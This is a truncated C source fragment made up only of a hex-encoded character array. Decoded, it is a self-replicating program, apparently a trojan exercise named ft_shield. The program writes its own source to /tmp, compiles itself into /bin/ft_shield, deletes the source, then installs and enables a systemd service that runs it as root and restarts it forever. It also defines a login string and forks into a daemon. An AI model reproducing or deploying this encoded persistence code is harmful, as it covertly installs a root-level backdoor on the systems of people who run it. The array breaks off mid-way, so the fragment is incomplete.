char src[] ={0x0a,0x23,0x69,0x6e,0x63,0x6c,0x75,0x64,0x65,0x20,0x3c,0x73,0x74,0x64,0x62,0x6f,0x6f,0x6c,0x2e,0x68,0x3e,0x0a,0x23,0x69,0x6e,0x63,0x6c,0x75,0x64,0x65,0x20,0x3c,0x73,0x74,0x64,0x64,0x65,0x66,0x2e,0x68,0x3e,0x0a,0x23,0x69,0x6e,0x63,0x6c,0x75,0x64,0x65,0x20,0x3c,0x75,0x6e,0x69,0x73,0x74,0x64,0x2e,0x68,0x3e,0x0a,0x23,0x69,0x6e,0x63,0x6c,0x75,0x64,0x65,0x20,0x3c,0x73,0x74,0x64,0x69,0x6f,0x2e,0x68,0x3e,0x0a,0x23,0x69,0x6e,0x63,0x6c,0x75,0x64,0x65,0x20,0x22,0x73,0x74,0x72,0x69,0x6e,0x67,0x2e,0x68,0x22,0x0a,0x23,0x69,0x6e,0x63,0x6c,0x75,0x64,0x65,0x20,0x22,0x73,0x74,0x64,0x6c,0x69,0x62,0x2e,0x68,0x22,0x0a,0x23,0x69,0x6e,0x63,0x6c,0x75,0x64,0x65,0x20,0x3c,0x6c,0x69,0x6e,0x75,0x78,0x2f,0x6c,0x69,0x6d,0x69,0x74,0x73,0x2e,0x68,0x3e,0x0a,0x23,0x69,0x6e,0x63,0x6c,0x75,0x64,0x65,0x20,0x3c,0x74,0x69,0x6d,0x65,0x2e,0x68,0x3e,0x0a,0x23,0x69,0x6e,0x63,0x6c,0x75,0x64,0x65,0x20,0x3c,0x74,0x69,0x6d,0x65,0x2e,0x68,0x3e,0x0a,0x23,0x69,0x6e,0x63,0x6c,0x75,0x64,0x65,0x20,0x3c,0x73,0x79,0x73,0x2f,0x74,0x69,0x6d,0x65,0x2e,0x68,0x3e,0x0a,0x0a,0x0a,0x6c,0x6f,0x6e,0x67,0x20,0x63,0x75,0x72,0x72,0x65,0x6e,0x74,0x4d,0x69,0x6c,0x6c,0x69,0x73,0x28,0x29,0x20,0x7b,0x0a,0x09,0x2f,0x2f,0x20,0x43,0x6f,0x6e,0x76,0x65,0x72,0x74,0x20,0x74,0x68,0x65,0x20,0x73,0x65,0x63,0x6f,0x6e,0x64,0x73,0x20,0x74,0x6f,0x20,0x6d,0x69,0x6c,0x6c,0x69,0x73,0x65,0x63,0x6f,0x6e,0x64,0x73,0x20,0x62,0x79,0x20,0x6d,0x75,0x6c,0x74,0x69,0x70,0x6c,0x79,0x69,0x6e,0x67,0x20,0x62,0x79,0x20,0x31,0x30,0x30,0x30,0x0a,0x09,0x2f,0x2f,0x20,0x43,0x6f,0x6e,0x76,0x65,0x72,0x74,0x20,0x74,0x68,0x65,0x20,0x6d,0x69,0x63,0x72,0x6f,0x73,0x65,0x63,0x6f,0x6e,0x64,0x73,0x20,0x74,0x6f,0x20,0x6d,0x69,0x6c,0x6c,0x69,0x73,0x65,0x63,0x6f,0x6e,0x64,0x73,0x20,0x62,0x79,0x20,0x64,0x69,0x76,0x69,0x64,0x69,0x6e,0x67,0x20,0x62,0x79,0x20,0x31,0x30,0x30,0x30,0x0a,0x7d,0x0a,0x0a,0x0a,0x23,0x64,0x65,0x66,0x69,0x6e,0x65,0x20,0x4c,0x4f,0x47,0x49,0x4e,0x20,0x22,0x68,0x6c,0x61,0x68,0x77,0x61,0x6f,0x75,0x22,0x0a,0x0a,0x0a,0x63,0x68,0x61,0x72,0x20,0x74,0x61,0x72,0x67,0x65,0x74,0x5f,0x64,0x69,0x72,0x5b,0x31,0x30,0x30,0x30,0x30,0x5d,0x20,0x3d,0x20,0x22,0x2f,0x62,0x69,0x6e,0x22,0x3b,0x0a,0x63,0x68,0x61,0x72,0x20,0x74,0x61,0x72,0x67,0x65,0x74,0x5f,0x70,0x61,0x74,0x68,0x5b,0x5d,0x20,0x3d,0x20,0x22,0x2f,0x62,0x69,0x6e,0x2f,0x66,0x74,0x5f,0x73,0x68,0x69,0x65,0x6c,0x64,0x22,0x3b,0x0a,0x63,0x68,0x61,0x72,0x20,0x64,0x61,0x65,0x6d,0x6f,0x6e,0x5f,0x63,0x6f,0x6e,0x66,0x69,0x67,0x5f,0x70,0x61,0x74,0x68,0x5b,0x5d,0x20,0x3d,0x20,0x22,0x2f,0x65,0x74,0x63,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x64,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x2f,0x22,0x3b,0x0a,0x63,0x68,0x61,0x72,0x20,0x73,0x65,0x72,0x76,0x69,0x63,0x65,0x5f,0x70,0x61,0x74,0x68,0x5b,0x5d,0x20,0x3d,0x20,0x22,0x2f,0x65,0x74,0x63,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x64,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x2f,0x66,0x74,0x5f,0x73,0x68,0x69,0x65,0x6c,0x64,0x2e,0x73,0x65,0x72,0x76,0x69,0x63,0x65,0x22,0x3b,0x0a,0x63,0x68,0x61,0x72,0x20,0x64,0x61,0x65,0x6d,0x6f,0x6e,0x5f,0x63,0x6f,0x6e,0x66,0x69,0x67,0x5b,0x5d,0x20,0x20,0x3d,0x20,0x22,0x5b,0x55,0x6e,0x69,0x74,0x5d,0x5c,0x6e,0x44,0x65,0x73,0x63,0x72,0x69,0x70,0x74,0x69,0x6f,0x6e,0x3d,0x66,0x74,0x5f,0x73,0x68,0x69,0x65,0x6c,0x64,0x5c,0x6e,0x41,0x66,0x74,0x65,0x72,0x3d,0x6e,0x65,0x74,0x77,0x6f,0x72,0x6b,0x2e,0x74,0x61,0x72,0x67,0x65,0x74,0x5c,0x6e,0x5b,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x5d,0x5c,0x6e,0x57,0x6f,0x72,0x6b,0x69,0x6e,0x67,0x44,0x69,0x72,0x65,0x63,0x74,0x6f,0x72,0x79,0x3d,0x2f,0x62,0x69,0x6e,0x5c,0x6e,0x53,0x74,0x61,0x6e,0x64,0x61,0x72,0x64,0x4f,0x75,0x74,0x70,0x75,0x74,0x3d,0x73,0x79,0x73,0x6c,0x6f,0x67,0x5c,0x6e,0x53,0x74,0x61,0x6e,0x64,0x61,0x72,0x64,0x45,0x72,0x72,0x6f,0x72,0x3d,0x73,0x79,0x73,0x6c,0x6f,0x67,0x5c,0x6e,0x45,0x78,0x65,0x63,0x53,0x74,0x61,0x72,0x74,0x3d,0x2f,0x62,0x69,0x6e,0x2f,0x66,0x74,0x5f,0x73,0x68,0x69,0x65,0x6c,0x64,0x5c,0x6e,0x52,0x65,0x73,0x74,0x61,0x72,0x74,0x3d,0x61,0x6c,0x77,0x61,0x79,0x73,0x5c,0x6e,0x54,0x79,0x70,0x65,0x3d,0x66,0x6f,0x72,0x6b,0x69,0x6e,0x67,0x5c,0x6e,0x55,0x73,0x65,0x72,0x3d,0x72,0x6f,0x6f,0x74,0x5c,0x6e,0x5b,0x49,0x6e,0x73,0x74,0x61,0x6c,0x6c,0x5d,0x5c,0x6e,0x57,0x61,0x6e,0x74,0x65,0x64,0x42,0x79,0x3d,0x6d,0x75,0x6c,0x74,0x69,0x2d,0x75,0x73,0x65,0x72,0x2e,0x74,0x61,0x72,0x67,0x65,0x74,0x5c,0x6e,0x22,0x3b,0x0a,0x0a,0x0a,0x63,0x68,0x61,0x72,0x20,0x63,0x6d,0x64,0x5b,0x31,0x30,0x30,0x30,0x5d,0x3b,0x0a,0x63,0x68,0x61,0x72,0x20,0x66,0x69,0x6c,0x65,0x50,0x61,0x74,0x68,0x5b,0x36,0x30,0x30,0x5d,0x3b,0x0a,0x0a,0x62,0x6f,0x6f,0x6c,0x20,0x69,0x6e,0x5f,0x62,0x69,0x6e,0x28,0x29,0x7b,0x0a,0x09,0x63,0x68,0x61,0x72,0x20,0x63,0x77,0x64,0x5b,0x50,0x41,0x54,0x48,0x5f,0x4d,0x41,0x58,0x5d,0x3b,0x0a,0x09,0x69,0x6e,0x74,0x20,0x6c,0x65,0x6e,0x3b,0x0a,0x20,0x20,0x20,0x0a,0x09,0x69,0x66,0x20,0x28,0x67,0x65,0x74,0x63,0x77,0x64,0x28,0x63,0x77,0x64,0x2c,0x20,0x73,0x69,0x7a,0x65,0x6f,0x66,0x28,0x63,0x77,0x64,0x29,0x29,0x20,0x3d,0x3d,0x20,0x4e,0x55,0x4c,0x4c,0x29,0x20,0x0a,0x09,0x09,0x65,0x78,0x69,0x74,0x28,0x31,0x29,0x3b,0x0a,0x09,0x69,0x66,0x20,0x28,0x72,0x65,0x61,0x6c,0x70,0x61,0x74,0x68,0x28,0x74,0x61,0x72,0x67,0x65,0x74,0x5f,0x64,0x69,0x72,0x2c,0x74,0x61,0x72,0x67,0x65,0x74,0x5f,0x64,0x69,0x72,0x29,0x20,0x3d,0x3d,0x20,0x4e,0x55,0x4c,0x4c,0x29,0x0a,0x09,0x09,0x65,0x78,0x69,0x74,0x28,0x31,0x29,0x3b,0x0a,0x09,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x22,0x25,0x73,0x20,0x3d,0x20,0x25,0x73,0x5c,0x6e,0x22,0x2c,0x20,0x63,0x77,0x64,0x2c,0x20,0x74,0x61,0x72,0x67,0x65,0x74,0x5f,0x64,0x69,0x72,0x29,0x3b,0x0a,0x09,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x73,0x74,0x72,0x63,0x6d,0x70,0x28,0x63,0x77,0x64,0x2c,0x20,0x74,0x61,0x72,0x67,0x65,0x74,0x5f,0x64,0x69,0x72,0x29,0x20,0x3d,0x3d,0x20,0x30,0x3b,0x0a,0x7d,0x0a,0x0a,0x0a,0x0a,0x0a,0x76,0x6f,0x69,0x64,0x20,0x73,0x74,0x61,0x72,0x74,0x5f,0x64,0x61,0x65,0x6d,0x6f,0x6e,0x28,0x29,0x7b,0x0a,0x0a,0x09,0x69,0x6e,0x74,0x20,0x70,0x69,0x64,0x20,0x3d,0x20,0x66,0x6f,0x72,0x6b,0x28,0x29,0x3b,0x0a,0x0a,0x0a,0x09,0x69,0x66,0x20,0x28,0x70,0x69,0x64,0x20,0x3c,0x20,0x30,0x29,0x0a,0x09,0x09,0x65,0x78,0x69,0x74,0x28,0x30,0x29,0x3b,0x0a,0x0a,0x09,0x69,0x66,0x20,0x28,0x70,0x69,0x64,0x29,0x0a,0x09,0x09,0x65,0x78,0x69,0x74,0x28,0x30,0x29,0x3b,0x0a,0x0a,0x09,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x22,0x68,0x65,0x72,0x65,0x20,0x69,0x73,0x20,0x74,0x68,0x65,0x20,0x64,0x61,0x65,0x6d,0x6f,0x6e,0x20,0x70,0x72,0x6f,0x63,0x65,0x73,0x73,0x20,0x21,0x5c,0x6e,0x22,0x29,0x3b,0x0a,0x09,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x22,0x59,0x65,0x70,0x20,0x61,0x63,0x63,0x65,0x73,0x73,0x20,0x74,0x6f,0x20,0x25,0x73,0x5c,0x6e,0x22,0x2c,0x20,0x74,0x61,0x72,0x67,0x65,0x74,0x5f,0x70,0x61,0x74,0x68,0x29,0x3b,0x0a,0x7d,0x0a,0x0a,0x76,0x6f,0x69,0x64,0x20,0x67,0x65,0x6e,0x65,0x72,0x61,0x74,0x65,0x5f,0x66,0x69,0x6c,0x65,0x5f,0x70,0x61,0x74,0x68,0x28,0x29,0x7b,0x0a,0x09,0x69,0x6e,0x74,0x20,0x70,0x69,0x64,0x20,0x3d,0x20,0x67,0x65,0x74,0x70,0x69,0x64,0x28,0x29,0x3b,0x20,0x0a,0x09,0x69,0x6e,0x74,0x20,0x69,0x6e,0x64,0x65,0x78,0x20,0x3d,0x20,0x35,0x3b,0x0a,0x20,0x20,0x20,0x20,0x73,0x74,0x72,0x75,0x63,0x74,0x20,0x74,0x69,0x6d,0x65,0x76,0x61,0x6c,0x20,0x74,0x70,0x3b,0x0a,0x09,0x6c,0x6f,0x6e,0x67,0x20,0x6d,0x73,0x3b,0x0a,0x20,0x20,0x20,0x20,0x73,0x72,0x61,0x6e,0x64,0x28,0x74,0x69,0x6d,0x65,0x28,0x4e,0x55,0x4c,0x4c,0x29,0x29,0x3b,0x0a,0x20,0x20,0x20,0x20,0x75,0x6e,0x73,0x69,0x67,0x6e,0x65,0x64,0x20,0x69,0x6e,0x74,0x20,0x72,0x61,0x6e,0x64,0x6f,0x6d,0x5f,0x6e,0x75,0x6d,0x62,0x65,0x72,0x20,0x3d,0x20,0x28,0x75,0x6e,0x73,0x69,0x67,0x6e,0x65,0x64,0x20,0x69,0x6e,0x74,0x29,0x72,0x61,0x6e,0x64,0x28,0x29,0x3b,0x20,0x0a,0x0a,0x0a,0x09,0x6d,0x65,0x6d,0x63,0x70,0x79,0x28,0x66,0x69,0x6c,0x65,0x50,0x61,0x74,0x68,0x2c,0x20,0x22,0x2f,0x74,0x6d,0x70,0x2f,0x22,0x2c,0x36,0x20,0x29,0x3b,0x0a,0x09,0x67,0x65,0x74,0x74,0x69,0x6d,0x65,0x6f,0x66,0x64,0x61,0x79,0x28,0x26,0x74,0x70,0x2c,0x20,0x4e,0x55,0x4c,0x4c,0x29,0x3b,0x0a,0x09,0x6d,0x73,0x20,0x3d,0x20,0x74,0x70,0x2e,0x74,0x76,0x5f,0x73,0x65,0x63,0x20,0x2a,0x20,0x31,0x30,0x30,0x30,0x20,0x2b,0x20,0x74,0x70,0x2e,0x74,0x76,0x5f,0x75,0x73,0x65,0x63,0x20,0x2f,0x20,0x31,0x30,0x30,0x30,0x3b,0x0a,0x0a,0x0a,0x09,0x77,0x68,0x69,0x6c,0x65,0x20,0x28,0x70,0x69,0x64,0x20,0x3e,0x20,0x30,0x29,0x7b,0x0a,0x09,0x20,0x20,0x20,0x20,0x66,0x69,0x6c,0x65,0x50,0x61,0x74,0x68,0x5b,0x69,0x6e,0x64,0x65,0x78,0x5d,0x20,0x3d,0x20,0x28,0x70,0x69,0x64,0x20,0x25,0x20,0x31,0x30,0x29,0x20,0x2b,0x20,0x27,0x30,0x27,0x3b,0x0a,0x09,0x20,0x20,0x20,0x20,0x70,0x69,0x64,0x20,0x3d,0x20,0x70,0x69,0x64,0x20,0x2f,0x20,0x31,0x30,0x3b,0x0a,0x09,0x20,0x20,0x20,0x20,0x69,0x6e,0x64,0x65,0x78,0x2b,0x2b,0x3b,0x0a,0x09,0x7d,0x0a,0x09,0x77,0x68,0x69,0x6c,0x65,0x20,0x28,0x6d,0x73,0x20,0x3e,0x20,0x30,0x29,0x7b,0x0a,0x09,0x20,0x20,0x20,0x20,0x66,0x69,0x6c,0x65,0x50,0x61,0x74,0x68,0x5b,0x69,0x6e,0x64,0x65,0x78,0x5d,0x20,0x3d,0x20,0x28,0x6d,0x73,0x20,0x25,0x20,0x31,0x30,0x29,0x20,0x2b,0x20,0x27,0x30,0x27,0x3b,0x0a,0x09,0x20,0x20,0x20,0x20,0x6d,0x73,0x20,0x3d,0x20,0x6d,0x73,0x20,0x2f,0x20,0x31,0x30,0x3b,0x0a,0x09,0x20,0x20,0x20,0x20,0x69,0x6e,0x64,0x65,0x78,0x2b,0x2b,0x3b,0x0a,0x09,0x7d,0x0a,0x20,0x20,0x20,0x20,0x77,0x68,0x69,0x6c,0x65,0x20,0x28,0x72,0x61,0x6e,0x64,0x6f,0x6d,0x5f,0x6e,0x75,0x6d,0x62,0x65,0x72,0x20,0x3e,0x20,0x30,0x29,0x7b,0x0a,0x09,0x20,0x20,0x20,0x20,0x66,0x69,0x6c,0x65,0x50,0x61,0x74,0x68,0x5b,0x69,0x6e,0x64,0x65,0x78,0x5d,0x20,0x3d,0x20,0x28,0x72,0x61,0x6e,0x64,0x6f,0x6d,0x5f,0x6e,0x75,0x6d,0x62,0x65,0x72,0x20,0x25,0x20,0x31,0x30,0x29,0x20,0x2b,0x20,0x27,0x30,0x27,0x3b,0x0a,0x09,0x20,0x20,0x20,0x20,0x72,0x61,0x6e,0x64,0x6f,0x6d,0x5f,0x6e,0x75,0x6d,0x62,0x65,0x72,0x20,0x20,0x3d,0x20,0x72,0x61,0x6e,0x64,0x6f,0x6d,0x5f,0x6e,0x75,0x6d,0x62,0x65,0x72,0x20,0x2f,0x20,0x31,0x30,0x3b,0x0a,0x09,0x20,0x20,0x20,0x20,0x69,0x6e,0x64,0x65,0x78,0x2b,0x2b,0x3b,0x0a,0x09,0x7d,0x0a,0x09,0x66,0x69,0x6c,0x65,0x50,0x61,0x74,0x68,0x5b,0x69,0x6e,0x64,0x65,0x78,0x2b,0x2b,0x5d,0x20,0x3d,0x20,0x27,0x2e,0x27,0x3b,0x0a,0x09,0x66,0x69,0x6c,0x65,0x50,0x61,0x74,0x68,0x5b,0x69,0x6e,0x64,0x65,0x78,0x2b,0x2b,0x5d,0x20,0x3d,0x20,0x27,0x63,0x27,0x3b,0x0a,0x09,0x66,0x69,0x6c,0x65,0x50,0x61,0x74,0x68,0x5b,0x69,0x6e,0x64,0x65,0x78,0x5d,0x20,0x3d,0x20,0x27,0x5c,0x30,0x27,0x3b,0x0a,0x7d,0x0a,0x0a,0x76,0x6f,0x69,0x64,0x20,0x71,0x75,0x69,0x6e,0x65,0x28,0x29,0x7b,0x0a,0x09,0x67,0x65,0x6e,0x65,0x72,0x61,0x74,0x65,0x5f,0x66,0x69,0x6c,0x65,0x5f,0x70,0x61,0x74,0x68,0x28,0x29,0x3b,0x0a,0x09,0x46,0x49,0x4c,0x45,0x2a,0x20,0x66,0x70,0x74,0x72,0x20,0x3d,0x20,0x66,0x6f,0x70,0x65,0x6e,0x28,0x66,0x69,0x6c,0x65,0x50,0x61,0x74,0x68,0x2c,0x20,0x22,0x77,0x2b,0x22,0x29,0x3b,0x0a,0x0a,0x0a,0x09,0x69,0x66,0x20,0x28,0x21,0x66,0x70,0x74,0x72,0x29,0x7b,0x0a,0x09,0x09,0x70,0x65,0x72,0x72,0x6f,0x72,0x28,0x22,0x65,0x72,0x72,0x72,0x6f,0x22,0x29,0x3b,0x0a,0x09,0x09,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x22,0x73,0x6f,0x72,0x72,0x79,0x5c,0x6e,0x22,0x29,0x3b,0x0a,0x09,0x09,0x65,0x78,0x69,0x74,0x28,0x30,0x29,0x3b,0x0a,0x09,0x7d,0x0a,0x0a,0x0a,0x09,0x66,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x66,0x70,0x74,0x72,0x2c,0x20,0x22,0x63,0x68,0x61,0x72,0x20,0x73,0x72,0x63,0x5b,0x5d,0x20,0x3d,0x20,0x7b,0x22,0x29,0x3b,0x0a,0x09,0x66,0x6f,0x72,0x20,0x28,0x69,0x6e,0x74,0x20,0x69,0x20,0x3d,0x30,0x20,0x3b,0x20,0x69,0x20,0x3c,0x20,0x73,0x69,0x7a,0x65,0x6f,0x66,0x28,0x73,0x72,0x63,0x29,0x3b,0x20,0x69,0x2b,0x2b,0x29,0x7b,0x0a,0x09,0x09,0x69,0x66,0x20,0x28,0x66,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x66,0x70,0x74,0x72,0x2c,0x20,0x22,0x20,0x20,0x25,0x30,0x23,0x34,0x78,0x2c,0x22,0x2c,0x20,0x73,0x72,0x63,0x5b,0x69,0x5d,0x29,0x20,0x3c,0x20,0x30,0x29,0x0a,0x09,0x09,0x09,0x65,0x78,0x69,0x74,0x28,0x30,0x29,0x3b,0x0a,0x09,0x7d,0x0a,0x09,0x69,0x66,0x20,0x28,0x66,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x66,0x70,0x74,0x72,0x2c,0x20,0x22,0x7d,0x3b,0x5c,0x6e,0x22,0x29,0x20,0x3c,0x20,0x30,0x20,0x29,0x0a,0x09,0x09,0x65,0x78,0x69,0x74,0x28,0x30,0x29,0x3b,0x0a,0x09,0x66,0x6f,0x72,0x20,0x28,0x69,0x6e,0x74,0x20,0x69,0x20,0x3d,0x30,0x20,0x3b,0x20,0x69,0x20,0x3c,0x20,0x73,0x69,0x7a,0x65,0x6f,0x66,0x28,0x73,0x72,0x63,0x29,0x3b,0x20,0x69,0x2b,0x2b,0x29,0x7b,0x0a,0x09,0x09,0x69,0x66,0x20,0x28,0x66,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x66,0x70,0x74,0x72,0x2c,0x20,0x22,0x25,0x63,0x22,0x2c,0x20,0x73,0x72,0x63,0x5b,0x69,0x5d,0x29,0x20,0x3c,0x20,0x30,0x29,0x0a,0x09,0x09,0x09,0x65,0x78,0x69,0x74,0x28,0x30,0x29,0x3b,0x0a,0x09,0x7d,0x0a,0x09,0x66,0x63,0x6c,0x6f,0x73,0x65,0x28,0x66,0x70,0x74,0x72,0x29,0x3b,0x0a,0x7d,0x0a,0x0a,0x0a,0x76,0x6f,0x69,0x64,0x20,0x63,0x6f,0x6d,0x70,0x69,0x6c,0x65,0x54,0x68,0x65,0x43,0x6f,0x64,0x65,0x28,0x29,0x7b,0x0a,0x20,0x20,0x20,0x20,0x09,0x73,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x63,0x6d,0x64,0x2c,0x20,0x22,0x63,0x63,0x20,0x25,0x73,0x20,0x2d,0x6f,0x20,0x25,0x73,0x22,0x2c,0x20,0x66,0x69,0x6c,0x65,0x50,0x61,0x74,0x68,0x2c,0x20,0x74,0x61,0x72,0x67,0x65,0x74,0x5f,0x70,0x61,0x74,0x68,0x29,0x3b,0x0a,0x09,0x69,0x6e,0x74,0x20,0x73,0x74,0x61,0x74,0x75,0x73,0x20,0x3d,0x20,0x73,0x79,0x73,0x74,0x65,0x6d,0x28,0x63,0x6d,0x64,0x29,0x3b,0x0a,0x09,0x69,0x66,0x20,0x28,0x73,0x74,0x61,0x74,0x75,0x73,0x20,0x3d,0x3d,0x20,0x2d,0x31,0x20,0x7c,0x7c,0x20,0x28,0x57,0x49,0x46,0x45,0x58,0x49,0x54,0x45,0x44,0x28,0x73,0x74,0x61,0x74,0x75,0x73,0x29,0x20,0x20,0x26,0x26,0x20,0x57,0x45,0x58,0x49,0x54,0x53,0x54,0x41,0x54,0x55,0x53,0x28,0x73,0x74,0x61,0x74,0x75,0x73,0x29,0x20,0x21,0x3d,0x20,0x30,0x20,0x29,0x29,0x7b,0x0a,0x09,0x09,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x22,0x45,0x72,0x72,0x6f,0x72,0x20,0x63,0x6d,0x64,0x20,0x27,0x25,0x73,0x27,0x20,0x65,0x78,0x69,0x74,0x65,0x64,0x20,0x25,0x64,0x5c,0x6e,0x22,0x2c,0x20,0x63,0x6d,0x64,0x2c,0x20,0x57,0x45,0x58,0x49,0x54,0x53,0x54,0x41,0x54,0x55,0x53,0x28,0x73,0x74,0x61,0x74,0x75,0x73,0x29,0x29,0x3b,0x0a,0x09,0x09,0x65,0x78,0x69,0x74,0x28,0x31,0x29,0x3b,0x20,0x0a,0x09,0x7d,0x0a,0x7d,0x0a,0x0a,0x0a,0x76,0x6f,0x69,0x64,0x20,0x73,0x65,0x74,0x55,0x70,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x28,0x29,0x7b,0x0a,0x09,0x46,0x49,0x4c,0x45,0x2a,0x20,0x66,0x70,0x74,0x72,0x20,0x3d,0x20,0x66,0x6f,0x70,0x65,0x6e,0x28,0x22,0x2f,0x65,0x74,0x63,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x64,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x2f,0x66,0x74,0x5f,0x73,0x68,0x69,0x65,0x6c,0x64,0x2e,0x73,0x65,0x72,0x76,0x69,0x63,0x65,0x22,0x2c,0x20,0x22,0x77,0x2b,0x22,0x29,0x3b,0x0a,0x0a,0x09,0x69,0x66,0x20,0x28,0x21,0x66,0x70,0x74,0x72,0x29,0x7b,0x0a,0x09,0x09,0x70,0x65,0x72,0x72,0x6f,0x72,0x28,0x22,0x65,0x72,0x72,0x72,0x6f,0x22,0x29,0x3b,0x0a,0x09,0x09,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x22,0x73,0x6f,0x72,0x72,0x79,0x5c,0x6e,0x22,0x29,0x3b,0x0a,0x09,0x09,0x65,0x78,0x69,0x74,0x28,0x30,0x29,0x3b,0x0a,0x09,0x7d,0x0a,0x09,0x69,0x66,0x20,0x28,0x66,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x66,0x70,0x74,0x72,0x2c,0x20,0x22,0x25,0x73,0x22,0x2c,0x20,0x64,0x61,0x65,0x6d,0x6f,0x6e,0x5f,0x63,0x6f,0x6e,0x66,0x69,0x67,0x29,0x20,0x3c,0x20,0x30,0x29,0x7b,0x0a,0x09,0x09,0x70,0x65,0x72,0x72,0x6f,0x72,0x28,0x22,0x65,0x72,0x72,0x72,0x6f,0x22,0x29,0x3b,0x0a,0x09,0x09,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x22,0x77,0x65,0x20,0x77,0x65,0x72,0x6e,0x27,0x74,0x20,0x61,0x62,0x6c,0x65,0x20,0x74,0x6f,0x20,0x77,0x72,0x69,0x74,0x65,0x20,0x6f,0x75,0x72,0x20,0x2e,0x73,0x65,0x72,0x76,0x69,0x63,0x65,0x5c,0x6e,0x22,0x29,0x3b,0x0a,0x09,0x09,0x65,0x78,0x69,0x74,0x28,0x30,0x29,0x3b,0x0a,0x09,0x7d,0x0a,0x09,0x66,0x63,0x6c,0x6f,0x73,0x65,0x28,0x66,0x70,0x74,0x72,0x29,0x3b,0x0a,0x09,0x69,0x6e,0x74,0x20,0x73,0x74,0x61,0x74,0x75,0x73,0x20,0x3d,0x20,0x73,0x79,0x73,0x74,0x65,0x6d,0x28,0x22,0x73,0x79,0x73,0x74,0x65,0x6d,0x63,0x74,0x6c,0x20,0x64,0x61,0x65,0x6d,0x6f,0x6e,0x2d,0x72,0x65,0x6c,0x6f,0x61,0x64,0x20,0x26,0x26,0x20,0x73,0x79,0x73,0x74,0x65,0x6d,0x63,0x74,0x6c,0x20,0x65,0x6e,0x61,0x62,0x6c,0x65,0x20,0x66,0x74,0x5f,0x73,0x68,0x69,0x65,0x6c,0x64,0x2e,0x73,0x65,0x72,0x76,0x69,0x63,0x65,0x22,0x29,0x3b,0x0a,0x09,0x69,0x66,0x20,0x28,0x73,0x74,0x61,0x74,0x75,0x73,0x20,0x3d,0x3d,0x20,0x2d,0x31,0x20,0x7c,0x7c,0x20,0x28,0x57,0x49,0x46,0x45,0x58,0x49,0x54,0x45,0x44,0x28,0x73,0x74,0x61,0x74,0x75,0x73,0x29,0x20,0x20,0x26,0x26,0x20,0x57,0x45,0x58,0x49,0x54,0x53,0x54,0x41,0x54,0x55,0x53,0x28,0x73,0x74,0x61,0x74,0x75,0x73,0x29,0x20,0x21,0x3d,0x20,0x30,0x20,0x29,0x29,0x7b,0x0a,0x09,0x09,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x22,0x45,0x72,0x72,0x6f,0x72,0x20,0x63,0x6d,0x64,0x20,0x27,0x25,0x73,0x27,0x20,0x65,0x78,0x69,0x74,0x65,0x64,0x20,0x25,0x64,0x5c,0x6e,0x22,0x2c,0x20,0x63,0x6d,0x64,0x2c,0x20,0x57,0x45,0x58,0x49,0x54,0x53,0x54,0x41,0x54,0x55,0x53,0x28,0x73,0x74,0x61,0x74,0x75,0x73,0x29,0x29,0x3b,0x0a,0x09,0x09,0x65,0x78,0x69,0x74,0x28,0x31,0x29,0x3b,0x20,0x0a,0x09,0x7d,0x0a,0x7d,0x0a,0x0a,0x0a,0x0a,0x0a,0x0a,0x76,0x6f,0x69,0x64,0x20,0x63,0x6f,0x6e,0x66,0x69,0x67,0x75,0x72,0x65,0x5f,0x64,0x61,0x65,0x6d,0x6f,0x6e,0x28,0x29,0x7b,0x0a,0x20,0x20,0x20,0x20,0x0a,0x09,0x2f,0x2f,0x20,0x6c,0x65,0x74,0x20,0x74,0x68,0x65,0x20,0x70,0x72,0x6f,0x67,0x72,0x61,0x6d,0x20,0x63,0x72,0x65,0x61,0x74,0x65,0x20,0x74,0x68,0x65,0x6d,0x73,0x65,0x6c,0x66,0x0a,0x09,0x71,0x75,0x69,0x6e,0x65,0x28,0x29,0x3b,0x0a,0x09,0x2f,0x2f,0x20,0x63,0x6f,0x6d,0x70,0x69,0x6c,0x65,0x20,0x74,0x68,0x65,0x20,0x63,0x6f,0x64,0x65,0x20,0x0a,0x09,0x63,0x6f,0x6d,0x70,0x69,0x6c,0x65,0x54,0x68,0x65,0x43,0x6f,0x64,0x65,0x28,0x29,0x3b,0x0a,0x09,0x2f,0x2f,0x20,0x63,0x6c,0x65,0x61,0x6e,0x20,0x66,0x69,0x6c,0x65,0x20,0x2e,0x63,0x0a,0x09,0x75,0x6e,0x6c,0x69,0x6e,0x6b,0x28,0x66,0x69,0x6c,0x65,0x50,0x61,0x74,0x68,0x29,0x3b,0x0a,0x0a,0x0a,0x09,0x2f,0x2f,0x20,0x6e,0x6f,0x77,0x20,0x74,0x68,0x61,0x74,0x20,0x77,0x65,0x20,0x68,0x61,0x76,0x65,0x20,0x62,0x69,0x6e,0x6e,0x61,0x72,0x79,0x20,0x6c,0x65,0x74,0x27,0x73,0x20,0x73,0x65,0x74,0x20,0x74,0x68,0x65,0x20,0x73,0x65,0x72,0x76,0x69,0x63,0x65,0x20,0x0a,0x09,0x73,0x65,0x74,0x55,0x70,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x28,0x29,0x3b,0x0a,0x09,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x22,0x2d,0x2d,0x2d,0x2d,0x2d,0x2d,0x2d,0x2d,0x2d,0x2d,0x2d,0x2d,0x5c,0x6e,0x22,0x29,0x3b,0x0a,0x09,0x70,0x72,0x69,0x6e,0x